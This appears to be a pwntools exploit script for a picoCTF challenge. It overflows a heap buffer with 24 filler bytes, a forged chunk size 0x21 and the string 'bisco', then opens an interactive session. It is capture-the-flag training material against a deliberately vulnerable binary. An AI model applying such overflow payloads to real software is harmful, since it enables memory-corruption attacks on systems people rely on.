#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("tethys.picoctf.net", 50466)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    	b main
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"A" * 8 * 3
payload += p64(0x21)
payload += b"bisco"

p.sendlineafter(b':', b'2')
p.sendlineafter(b"Data for buffer: ", payload)
p.sendlineafter(b':', b'4')

p.interactive()
